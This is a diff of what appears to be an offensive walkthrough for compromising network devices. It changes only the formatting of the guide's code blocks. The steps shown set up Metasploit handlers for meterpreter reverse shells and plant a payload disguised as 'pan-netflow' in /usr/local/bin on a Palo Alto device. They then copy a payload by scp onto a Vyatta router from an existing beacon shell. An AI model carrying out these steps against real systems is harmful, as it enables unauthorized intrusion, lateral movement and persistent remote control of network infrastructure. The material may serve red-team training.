@@ -526,22 +526,23 @@ In one of your empty terminals on your attack box
 `msfconsole`
 
 2. set up your multi handler to catch the palo alto payload
-  
-`use exploit/multi/handler`  
-`set PAYLOAD linux/x86/meterpreter/reverse_tcp` (for the Palo) 
-`set LHOST <Your_Attacker_IP>`  
-`set LPORT 50189`  
-`set ExitOnSession false`
-`show options` (this will let you check to make sure everything is set properly) 
-`exploit -j`
-
+``` 
+use exploit/multi/handler  
+set PAYLOAD linux/x86/meterpreter/reverse_tcp (for the Palo) 
+set LHOST <Your_Attacker_IP> 
+set LPORT 50189 
+set ExitOnSession false
+show options (this will let you check to make sure everything is set properly) 
+exploit -j`
+```
 
 
 In the terminal that has your beacon shell (palo alto callback)
- `cd ~`
- `chmod +x pan-netflow`
- `mv pan-netflow /usr/local/bin/pan-netflow`
-
+ ```
+ cd ~
+ chmod +x pan-netflow
+ mv pan-netflow /usr/local/bin/pan-netflow
+ ```
 3. cd to where the file is  
 `cd /usr/local/bin`
 4. run the file and send it to the background so you can continue to use your shell  
@@ -565,15 +566,15 @@ Go to your meterpreter screen
 `msfconsole`
 
 2. set up your multi handler to catch the palo alto payload 
-  
-`use exploit/multi/handler`  
-`set PAYLOAD linux/x64/meterpreter/reverse_tcp` for the Vyatta  
-`set LHOST <Your_Attacker_IP>`  
-`set LPORT 50189`  
-`set ExitOnSession false`
-`show options` (this will let you check to make sure everything is set properly) 
-`exploit -j`
-
+ ``` 
+use exploit/multi/handler  
+set PAYLOAD linux/x64/meterpreter/reverse_tcp for the Vyatta  
+set LHOST <Your_Attacker_IP>
+set LPORT 50189  
+set ExitOnSession false
+show options (this will let you check to make sure everything is set properly) 
+exploit -j
+```
 3. On our palo alto callback shell 
  scp the payload file from the server and place it in the /usr/local/bin folder on the vyatta router
  `scp <payload-file> vyatta@<vyatta-router-IP>:/usr/local/bin/`
